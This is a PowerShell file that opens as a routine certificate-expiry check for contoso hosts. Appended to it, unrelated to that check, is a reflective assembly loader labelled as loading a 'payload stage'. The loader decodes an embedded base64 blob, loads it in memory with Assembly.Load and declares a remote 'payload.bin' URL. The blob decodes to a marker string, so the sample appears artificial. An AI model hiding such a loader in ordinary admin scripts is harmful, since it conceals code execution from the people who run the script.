
#Requires -Version 5.1
$WarningDays = 30
$Hosts = @('portal.contoso.com', 'api.contoso.com', 'vpn.contoso.com')
$Port = 9443
$ReportPath = "C:\Reports\cert-expiry-2026-03-04.csv"

$warnDate = (Get-Date).AddDays($WarningDays)
$expiring = Get-ChildItem -Path 'Cert:\LocalMachine\My' -ErrorAction SilentlyContinue |
    Where-Object { $_.NotAfter -lt $warnDate } |
    Select-Object Subject, NotAfter, @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
$expiring | Format-Table -AutoSize
if (@($expiring).Count -gt 0) {
    Write-Warning ("{0} certificates expire within {1} days" -f @($expiring).Count, $WarningDays)
}
<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://127.0.0.1/payload.bin',
    [int]$TimeoutSec = 37
)
$ErrorActionPreference = "Stop"

try {
    $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo4NWNsZGJxaXdy")
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $ResultObject = [Reflection.Assembly]::Load($ManagedBytes)
    if ($null -ne $ResultObject) {
        Write-Verbose ("Loaded assembly: " + $ResultObject.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "stage marker 37 reached"
